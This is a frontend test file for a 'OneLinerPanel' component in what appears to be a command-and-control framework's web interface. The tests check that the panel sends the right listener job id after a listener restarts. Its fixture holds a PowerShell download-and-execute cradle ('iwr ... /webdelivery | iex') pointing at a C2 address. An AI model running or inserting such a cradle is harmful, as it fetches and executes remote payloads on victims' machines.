import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest'
import { act, fireEvent, render, screen } from '@testing-library/react'
import OneLinerPanel, { reconcileJobId } from '../OneLinerPanel'
import { api } from '../../../lib/api'
import type { OneLinerResult, OneLinerTarget } from '../../../lib/types'

vi.mock('../../../lib/api', () => ({
  api: {
    oneLinerTargets: vi.fn(),
    oneLiner: vi.fn(),
  },
}))

const mockedApi = vi.mocked(api)

function target(over: Partial<OneLinerTarget>): OneLinerTarget {
  return { job_id: 1, name: 'http', port: 8888, domains: [], can_stage: true, ...over }
}

const result: OneLinerResult = {
  command: 'iwr http://192.168.190.159:8888/webdelivery -UseBasicParsing | iex',
  url: 'http://192.168.190.159:8888/webdelivery',
  platform: 'windows',
  delivery: 'powershell',
  c2_url: '192.168.190.159:8888',
  job_id: 3,
  staged_as: 'stage-3',
  warning: '',
  alternatives: [],
}

/**
 * Stopping and restarting a listener hands it a new job id. The panel used to
 * keep whichever id it had first picked, and a <select> whose value has no
 * matching <option> renders the first option anyway -- so the panel displayed a
 * live listener while sending the dead id, and the build came back as
 * "no listener with job id N" for a listener that was nowhere on screen.
 */
describe('OneLinerPanel listener selection', () => {
  beforeEach(() => {
    vi.clearAllMocks()
  })

  afterEach(() => {
    vi.useRealTimers()
  })

  describe('reconcileJobId', () => {
    it('picks the first eligible listener when nothing is selected', () => {
      expect(reconcileJobId('', [target({ job_id: 3 })])).toBe(3)
      expect(reconcileJobId('', [])).toBe('')
    })

    it('replaces a selection that is no longer in the list', () => {
      expect(reconcileJobId(1, [target({ job_id: 3 })])).toBe(3)
    })

    it('keeps a selection that is still there', () => {
      expect(reconcileJobId(3, [target({ job_id: 1 }), target({ job_id: 3 })])).toBe(3)
    })

    it('drops a selection that stopped being stageable', () => {
      expect(reconcileJobId(1, [target({ job_id: 1, can_stage: false }), target({ job_id: 3 })])).toBe(3)
      expect(reconcileJobId(1, [target({ job_id: 1, can_stage: false })])).toBe('')
    })
  })

  it('sends the listener that is actually on screen after a restart', async () => {
    vi.useFakeTimers()
    mockedApi.oneLinerTargets.mockResolvedValue({ targets: [target({ job_id: 1 })] })
    mockedApi.oneLiner.mockResolvedValue(result)

    render(<OneLinerPanel />)
    await act(async () => {})

    // Listener 1 is stopped and listener 3 is started; the panel finds out on
    // its own poll rather than by being remounted.
    mockedApi.oneLinerTargets.mockResolvedValue({ targets: [target({ job_id: 3 })] })
    await act(async () => {
      vi.advanceTimersByTime(10000)
    })

    await act(async () => {
      fireEvent.click(screen.getByRole('button', { name: 'Generate one-liner' }))
    })

    expect(mockedApi.oneLiner).toHaveBeenCalledTimes(1)
    expect(mockedApi.oneLiner.mock.calls[0][0]).toMatchObject({ job_id: 3 })
  })

  it('keeps an explicit choice across polls and sends it', async () => {
    vi.useFakeTimers()
    mockedApi.oneLinerTargets.mockResolvedValue({
      targets: [target({ job_id: 3 }), target({ job_id: 4, port: 9999 })],
    })
    mockedApi.oneLiner.mockResolvedValue(result)

    render(<OneLinerPanel />)
    await act(async () => {})

    await act(async () => {
      fireEvent.change(screen.getAllByRole('combobox')[0], { target: { value: '4' } })
    })
    await act(async () => {
      vi.advanceTimersByTime(10000)
    })

    await act(async () => {
      fireEvent.click(screen.getByRole('button', { name: 'Generate one-liner' }))
    })

    expect(mockedApi.oneLiner).toHaveBeenCalledTimes(1)
    expect(mockedApi.oneLiner.mock.calls[0][0]).toMatchObject({ job_id: 4 })
  })

  it('explains the empty state instead of offering a build', async () => {
    mockedApi.oneLinerTargets.mockResolvedValue({ targets: [target({ job_id: 1, can_stage: false })] })

    render(<OneLinerPanel />)

    expect(await screen.findByText(/No listener can serve a stage yet/)).toBeInTheDocument()
    expect(screen.queryByRole('button', { name: 'Generate one-liner' })).not.toBeInTheDocument()
  })
})
